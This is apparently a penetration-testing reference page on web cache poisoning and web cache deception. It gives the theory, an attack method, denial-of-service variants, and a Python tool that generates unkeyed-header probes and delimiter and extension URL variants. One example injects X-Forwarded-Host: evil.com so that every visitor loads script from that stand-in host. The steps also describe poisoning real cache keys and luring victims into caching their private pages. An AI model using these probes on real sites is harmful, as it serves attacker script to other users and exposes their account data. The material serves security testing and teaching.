---
title: "Web Cache Poisoning and Web Cache Deception"
category: web
subcategory: cache
type: technique
tags: [web-cache-poisoning, web-cache-deception, wcd, cache-key, unkeyed-header, x-forwarded-host, param-miner, cache-buster, path-normalization, delimiter, cpdos, vary, cdn, burp]
difficulty: medium
summary: "Unkeyed input (X-Forwarded-Host, a delimiter param) reflected into a cached response poisons it for everyone; path/extension tricks make a cache store a victim's authenticated page."
when_to_use:
  - "A CDN/cache fronts the app (X-Cache, Age, CF-Cache-Status headers present)"
  - "A header or parameter is reflected but not part of the cache key"
  - "An authenticated page is reachable at a URL that looks static (/account/x.css)"
  - "You want to turn a self-only reflected bug into a stored, victim-facing one"
tools: [burp, param-miner, python3]
related: [smuggling-http, node-parameter-pollution, race-xsleaks, node-cors-postmessage-websocket]
---

## TL;DR

A cache stores a response under a **cache key** (usually Host + path + query). Any input the app
reflects but the cache does *not* include in the key is "unkeyed": poison it once and the cache
serves your payload to every later visitor (poisoning). Separately, if the cache decides what to
store by URL shape (extension/path), you can trick it into storing a victim's *authenticated*
page at a URL you can read (deception).

## Recognise it

- Response headers: `X-Cache: hit/miss`, `Age:`, `CF-Cache-Status:`, `X-Served-By`,
  `Cache-Control: public`, `Vary:`.
- A header (`X-Forwarded-Host`, `X-Forwarded-Scheme`) that changes the response body (e.g. an
  absolute URL in a `<link>`/`<script>`).
- A dynamic, sensitive page served with cache-friendly headers.
- A static-looking path (`/js/`, `/static/`, `*.css`) mapped to a dynamic handler.

## Theory

### Poisoning: keyed vs unkeyed

The cache key is what makes two requests "the same". Defaults are Host + path + (often) query.
Anything else -- most request headers, and sometimes specific query params -- is **unkeyed**:
the cache ignores it when matching, so your request with a malicious unkeyed header produces a
response that gets stored and served to requests *without* that header.

Classic unkeyed inputs to test (Param Miner brute-forces these):

```
X-Forwarded-Host       X-Host                 X-Forwarded-Server
X-Forwarded-Scheme     X-Forwarded-Proto      X-Forwarded-Port
X-Original-URL         X-Rewrite-URL          X-Original-Host
X-HTTP-Method-Override X-Forwarded-For        Forwarded
```

If `X-Forwarded-Host: evil.com` makes the app emit
`<script src="//evil.com/a.js">` and that response is cached, every visitor loads your script.

### Cache-buster methodology

To test without poisoning real users, add a unique unkeyed param
(`?cb=<random>`) so your probe gets its own cache entry. Confirm:

1. Send with the injected header + cache-buster -> reflected in the body, `X-Cache: miss`.
2. Send again with only the cache-buster, no header -> if the reflection persists and
   `X-Cache: hit`, the input is unkeyed and cacheable = poisonable.

### `Vary`, fat GET, parameter cloaking

- `Vary: X-Foo` adds `X-Foo` to the key -- if the app relies on an unkeyed header the cache
  does not `Vary` on, you win.
- **Fat GET**: a GET with a body; some caches key on the URL only while the origin reads the
  body -> unkeyed body input.
- **Parameter cloaking**: a cache and origin split parameters differently. `?x=1;y=2` -- if the
  cache treats `;` as part of the value but the origin splits on it, you smuggle an unkeyed
  `y`. Similarly `?utm=1&callback=evil` where the cache strips `utm*` but keys the rest.
- **Key normalisation/injection**: `?` and `#` handling, `%23`, and path normalisation
  (`/x/..%2fadmin`) can make the cache key differ from the resource the origin serves.

### CPDoS (denial via cache)

Poison a cache with an *error*:

- **HHO** (HTTP Header Oversize): send a header larger than the origin accepts but the cache
  forwards -> origin 400, cached for everyone.
- **HMC** (HTTP Meta Character): a control char in a header -> origin error, cached.
- **HMO** (HTTP Method Override): `X-HTTP-Method-Override: POST` -> origin rejects, cached.

### Deception: storing a victim's private page

The cache decides to store based on URL shape, but the origin serves dynamic content:

- **Path mapping**: `/account.php/nonexistent.css` -- origin ignores the extra path and returns
  your account page; the cache sees `.css` and caches it. Now `/account.php/x.css` holds a
  victim's account data if you get them to visit it.
- **Path delimiters**: `;`, `%3f`, `%23`, `.`, `?` -- origin and cache disagree where the "real"
  path ends. `/account;.css`, `/account%00.css`, `/account%23.css`.
- **Static-directory rules**: `/static/..%2faccount` -- normalises to `/account` at the origin
  but matches the "cache everything under /static" rule.
- **Static-extension rules**: caches often force-cache `.css/.js/.jpg/.ico/.svg` regardless of
  `Cache-Control`. Append a fake one.
- **Origin URL-parsing differences**: Tomcat treats `;` as a path-parameter delimiter, .NET
  maps `/account.aspx/x.css`, nginx-vs-origin differ on `%2f` and trailing dots. Per-CDN
  delimiter discovery (2024 path-normalisation research) is the modern angle.

## Attack

1. Confirm a cache is present (cache headers) and find cacheable responses.
2. **Poisoning**: brute unkeyed headers with a cache-buster; find one reflected into HTML/JS;
   escalate to stored XSS or resource hijack; then poison without the cache-buster to hit the
   real key.
3. **Deception**: append delimiter/extension variants to a sensitive page; find one the origin
   still serves dynamically but the cache stores; verify the cached copy contains the private
   data; deliver the URL to the victim (they cache their own data, you read it).
4. Prove impact (poisoned entry served to a clean request; another user's data in a cached URL).

## Code

```python
#!/usr/bin/env python3
"""Cache poisoning + deception tooling.

- header_candidates(): the unkeyed-header wordlist.
- is_cache_hit(): verdict from response headers.
- deception_variants(): delimiter/extension URL mutations.
- poison_probe()/deception_probe(): network testing with requests.

The __main__ self-test exercises the pure functions offline with synthetic
header dicts and URL lists -- no network needed.
"""
from __future__ import annotations

import random
import sys
import urllib.parse

UNKEYED_HEADERS = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Original-Host",
    "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Forwarded-Port",
    "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "Forwarded",
    "X-HTTP-Method-Override", "X-Forwarded-SSL",
]

DECEPTION_DELIMITERS = [";", "%3b", "%23", "%3f", "%2e", "/", "%00", "%0a"]
DECEPTION_EXTENSIONS = [".css", ".js", ".jpg", ".ico", ".svg", ".png", ".woff",
                        ".gif", ".txt"]


def cache_buster(param: str = "cb") -> str:
    return "%s=%d" % (param, random.randint(10 ** 8, 10 ** 9))


def is_cache_hit(headers: dict[str, str]) -> bool:
    """True when the response looks like it came from a cache."""
    h = {k.lower(): v.lower() for k, v in headers.items()}
    if h.get("x-cache", "").find("hit") >= 0:
        return True
    if h.get("cf-cache-status") in ("hit", "revalidated", "updating"):
        return True
    if h.get("x-cache-hits", "0") not in ("", "0"):
        return True
    try:
        if int(h.get("age", "0")) > 0:
            return True
    except ValueError:
        pass
    return "x-served-by" in h and "hit" in h.get("x-served-by", "")


def is_cacheable(headers: dict[str, str]) -> bool:
    """True when the response is storable by a shared cache."""
    h = {k.lower(): v.lower() for k, v in headers.items()}
    cc = h.get("cache-control", "")
    if "no-store" in cc or "private" in cc or "no-cache" in cc:
        return False
    if "public" in cc or "max-age" in cc or "s-maxage" in cc:
        return True
    return "age" in h or "x-cache" in h


def deception_verdict(status: int, headers: dict[str, str],
                      has_private_marker: bool) -> str:
    """Is this response both authenticated-looking AND cacheable?"""
    if status != 200:
        return "no:status-%d" % status
    if not has_private_marker:
        return "no:no-private-data"
    if is_cacheable(headers):
        return "vulnerable:cacheable-private-page"
    return "no:not-cacheable"


def deception_variants(path: str) -> list[str]:
    """URL mutations that may confuse cache vs origin path parsing."""
    out = []
    for ext in DECEPTION_EXTENSIONS:
        out.append(path + "/nonexistent" + ext)     # path-mapping
        for d in DECEPTION_DELIMITERS:
            out.append(path + d + "x" + ext)         # delimiter + fake ext
    out.append("/static/..%2f" + path.lstrip("/"))   # static-dir traversal
    out.append("/static/%2e%2e/" + path.lstrip("/"))
    # dedupe, preserve order
    seen, uniq = set(), []
    for u in out:
        if u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def poison_probe(url: str, header: str, marker: str, session=None):
    """Two-step unkeyed-header test with a cache-buster. Needs requests."""
    import requests
    s = session or requests.Session()
    cb = cache_buster()
    u = url + ("&" if urllib.parse.urlparse(url).query else "?") + cb
    r1 = s.get(u, headers={header: marker}, timeout=10)     # inject
    r2 = s.get(u, timeout=10)                               # no header
    return {
        "reflected_first": marker in r1.text,
        "persisted_second": marker in r2.text,
        "second_is_hit": is_cache_hit(dict(r2.headers)),
        "poisonable": (marker in r2.text) and is_cache_hit(dict(r2.headers)),
    }


def _self_test() -> None:
    # cache-hit detection across CDNs
    assert is_cache_hit({"X-Cache": "HIT"})
    assert is_cache_hit({"CF-Cache-Status": "HIT"})
    assert is_cache_hit({"Age": "42"})
    assert not is_cache_hit({"X-Cache": "MISS", "Age": "0"})
    assert not is_cache_hit({})

    # cacheability
    assert is_cacheable({"Cache-Control": "public, max-age=60"})
    assert not is_cacheable({"Cache-Control": "private, no-store"})
    assert not is_cacheable({"Cache-Control": "no-cache"})
    assert is_cacheable({"Age": "5"})

    # deception verdict: private + cacheable = win
    assert deception_verdict(
        200, {"Cache-Control": "public, max-age=30"}, True) == \
        "vulnerable:cacheable-private-page"
    assert deception_verdict(
        200, {"Cache-Control": "private"}, True) == "no:not-cacheable"
    assert deception_verdict(
        200, {"Cache-Control": "public"}, False) == "no:no-private-data"
    assert deception_verdict(
        302, {"Cache-Control": "public"}, True) == "no:status-302"

    # deception variants include path-mapping, delimiters and traversal
    vs = deception_variants("/account")
    assert "/account/nonexistent.css" in vs
    assert any(";x.css" in v for v in vs)
    assert any(v.startswith("/static/..%2f") for v in vs)
    assert len(vs) == len(set(vs)), "variants must be unique"
    assert len(vs) > 20

    # unkeyed header list has the essentials
    assert "X-Forwarded-Host" in UNKEYED_HEADERS
    assert "X-Original-URL" in UNKEYED_HEADERS
    assert len(UNKEYED_HEADERS) >= 12

    # cache-buster is unique-ish and well-formed
    a, b = cache_buster(), cache_buster()
    assert a.startswith("cb=") and a != b

    print("[ok] %d unkeyed headers, %d deception variants, cache verdicts verified"
          % (len(UNKEYED_HEADERS), len(vs)))


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: %s <path>  (prints deception variants)" % sys.argv[0])
        return 1
    for v in deception_variants(sys.argv[1]):
        print(v)
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **Always use a cache-buster while testing** or you poison real users (and cannot tell your
  reflection from a genuine hit).
- **Unkeyed does not mean exploitable** -- the input must reach the response *body* (or a
  security-relevant header) and be cached. A reflected header in a header the cache does not
  store is nothing.
- **`Vary`** can save you or foil you: if the app varies on the header you are abusing, its
  value becomes part of the key and poisoning fails.
- **Deception needs the origin to serve dynamic content at the mutated URL** while the cache
  stores it -- verify both halves; a 404 that gets cached is only a CPDoS, not data theft.
- **Static-extension force-caching** overrides `Cache-Control: private` on many CDNs -- that is
  the crux of extension-based deception.
- **Per-CDN behaviour**: Cloudflare, Akamai, Fastly, nginx, Varnish all normalise paths and
  delimiters differently; the working delimiter is target-specific (enumerate).
- **Chaining**: request smuggling can *inject* an unkeyed request that the cache stores -- a
  smuggling-to-poisoning chain reaches caches you cannot address directly.
- **Cache key flattening**: some caches lowercase/normalise the path; `/Account` vs `/account`
  may or may not be the same entry.
- **Time-to-live**: a poisoned entry lasts until `max-age`/`Age` expires or the key is purged;
  short TTLs need re-poisoning.

## Tools

- Burp "Param Miner" (Albinowax) -- unkeyed header/param and cache-key discovery.
- Burp scanner's cache-poisoning checks and the Web Cache Deception checks.
- The header/variant generators above for scripted sweeps.

## References

- James Kettle -- "Practical Web Cache Poisoning" and "Web Cache Entanglement".
- Omer Gil -- "Web Cache Deception Attack" (the original WCD research).
- PortSwigger Web Security Academy -- Web cache poisoning / Web cache deception labs.
- Hoai et al. -- CPDoS (Cache-Poisoned Denial of Service) research.
